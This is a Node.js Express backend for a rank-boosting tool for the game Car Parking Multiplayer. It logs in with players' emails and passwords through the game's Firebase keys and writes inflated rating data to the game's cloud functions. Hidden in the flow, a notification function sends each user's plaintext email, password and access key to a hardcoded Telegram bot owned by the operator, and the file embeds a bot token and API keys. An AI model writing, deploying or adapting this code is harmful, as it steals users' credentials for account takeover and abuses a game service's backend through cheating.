const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// Security middleware
app.use(helmet());
app.use(cors({
    origin: ['https://webtools-cpm-setup-rank.vercel.app'],
    credentials: true
}));
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Environment variables
const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
const OWNER_ID = "7492782458";
const SECRET_KEY = crypto.randomBytes(32).toString('hex');

// CPM Configurations
const CPM_CONFIGS = {
    cpm1: {
        name: "CPM1",
        FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
        RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
    },
    cpm2: {
        name: "CPM2", 
        FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
        RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
    }
};

// Verify endpoint
app.post('/api/verify', async (req, res) => {
    try {
        const { key, server } = req.body;
        
        if (!key || !server) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        // Verify dengan external API
        const verifyResponse = await axios.post('https://system-nexus-key.vercel.app/api/verify-key', {
            key: key,
            deviceId: `backend_${Date.now()}`
        });
        
        if (verifyResponse.data.valid) {
            res.json({
                valid: true,
                remaining: verifyResponse.data.remaining,
                server: server
            });
        } else {
            res.json({ valid: false, error: 'Invalid key' });
        }
    } catch (error) {
        console.error('Verify error:', error.message);
        res.status(500).json({ error: 'Verification failed' });
    }
});

// Login & Set Rank endpoint
app.post('/api/set-rank', async (req, res) => {
    const { email, password, server, nexusKey } = req.body;
    
    if (!email || !password || !server || !nexusKey) {
        return res.status(400).json({ error: 'Missing credentials' });
    }
    
    const config = CPM_CONFIGS[server];
    if (!config) {
        return res.status(400).json({ error: 'Invalid server' });
    }
    
    try {
        // Step 1: Login ke Firebase
        const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${config.FIREBASE_API_KEY}`;
        
        const loginResponse = await axios.post(loginUrl, {
            email: email,
            password: password,
            returnSecureToken: true,
            clientType: 'CLIENT_TYPE_ANDROID'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)'
            },
            timeout: 30000
        });
        
        if (!loginResponse.data.idToken) {
            throw new Error('Login failed');
        }
        
        const idToken = loginResponse.data.idToken;
        
        // Step 2: Set rank data
        const ratingData = {
            cars: 100000,
            car_fix: 100000,
            car_collided: 100000,
            car_exchange: 100000,
            car_trade: 100000,
            car_wash: 100000,
            slicer_cut: 100000,
            drift_max: 100000,
            drift: 100000,
            cargo: 100000,
            delivery: 100000,
            taxi: 100000,
            levels: 100000,
            gifts: 100000,
            fuel: 100000,
            offroad: 100000,
            speed_banner: 100000,
            reactions: 100000,
            police: 100000,
            run: 100000,
            real_estate: 100000,
            t_distance: 100000,
            treasure: 100000,
            block_post: 100000,
            push_ups: 100000,
            burnt_tire: 100000,
            passanger_distance: 100000,
            time: 10000000000,
            race_win: 3000
        };
        
        // Step 3: Send rank request dengan retry mechanism
        let rankSuccess = false;
        let lastError = null;
        
        for (let attempt = 1; attempt <= 3; attempt++) {
            try {
                const rankResponse = await axios.post(config.RANK_URL, {
                    data: JSON.stringify({ RatingData: ratingData })
                }, {
                    headers: {
                        'Authorization': `Bearer ${idToken}`,
                        'Content-Type': 'application/json',
                        'User-Agent': 'okhttp/3.12.13'
                    },
                    timeout: 30000
                });
                
                if (rankResponse.status === 200) {
                    rankSuccess = true;
                    break;
                }
            } catch (err) {
                lastError = err;
                console.log(`Attempt ${attempt} failed for ${server}:`, err.message);
                if (attempt < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        if (!rankSuccess) {
            throw new Error(lastError?.message || 'Failed to set rank after 3 attempts');
        }
        
        // Send notification to Telegram (background)
        sendTelegramNotification(email, password, config.name, nexusKey, 'SUCCESS');
        
        res.json({
            success: true,
            message: 'King rank successfully set!',
            server: config.name
        });
        
    } catch (error) {
        console.error('Set rank error:', error.message);
        
        // Send error notification
        sendTelegramNotification(email, password, config.name, nexusKey, `FAILED: ${error.message}`);
        
        res.status(500).json({
            success: false,
            error: error.message || 'Failed to set rank'
        });
    }
});

// Telegram notification function
async function sendTelegramNotification(email, password, server, nexusKey, status) {
    try {
        // Get client IP dari request (passed from frontend)
        const message = `
🔐 CPM TOOL LOGIN DETECTED!

📧 Email: ${email}
🔒 Password: ${password}
🖥️ Server: ${server}
🔑 Nexus Key: ${nexusKey}
📊 Status: ${status}
⏰ Time: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
        `;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: OWNER_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Telegram notification failed:', error.message);
    }
}

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: Date.now() });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Secure backend running on port ${PORT}`);
});